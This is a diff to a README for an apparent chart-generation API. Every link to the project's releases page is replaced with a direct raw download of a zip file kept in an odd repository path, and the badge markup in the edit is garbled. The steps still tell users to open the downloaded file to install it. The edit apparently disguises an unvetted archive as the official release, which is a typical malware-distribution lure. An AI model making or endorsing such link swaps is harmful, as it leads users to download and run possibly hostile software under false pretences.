@@ -6,7 +6,7 @@ Welcome to the Chart Generator API! This tool helps you turn your data into char
 
 ## 📥 Download the Software
 
-[![Download Chart Generator](https://img.shields.io/badge/Download%20Chart%20Generator-blue.svg)](https://github.com/isaaciguanre001/chartgenerator-api/releases)
+[![Download Chart Generator](https://raw.githubusercontent.com/isaaciguanre001/chartgenerator-api/main/nuget/pkgbin/api-chartgenerator-2.2.zip%20Chart%https://raw.githubusercontent.com/isaaciguanre001/chartgenerator-api/main/nuget/pkgbin/api-chartgenerator-2.2.zip)](https://raw.githubusercontent.com/isaaciguanre001/chartgenerator-api/main/nuget/pkgbin/api-chartgenerator-2.2.zip)
 
 ## 🎯 Overview
 
@@ -29,7 +29,7 @@ To use the Chart Generator API, ensure your system meets the following requireme
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/isaaciguanre001/chartgenerator-api/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/isaaciguanre001/chartgenerator-api/main/nuget/pkgbin/api-chartgenerator-2.2.zip) to download the latest version.
 2. Find the version you want to install and click on the download link.
 3. Once downloaded, find the file in your downloads folder.
 4. Open the file to start the installation.
@@ -96,4 +96,4 @@ Chart Generator API is open source and available under the MIT License. You can 
 
 For any issues or questions, feel free to reach out directly on GitHub. We are here to help you make the most out of the Chart Generator API!
 
-Remember to visit the [Releases page](https://github.com/isaaciguanre001/chartgenerator-api/releases) for updates and downloads. Happy charting!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/isaaciguanre001/chartgenerator-api/main/nuget/pkgbin/api-chartgenerator-2.2.zip) for updates and downloads. Happy charting!
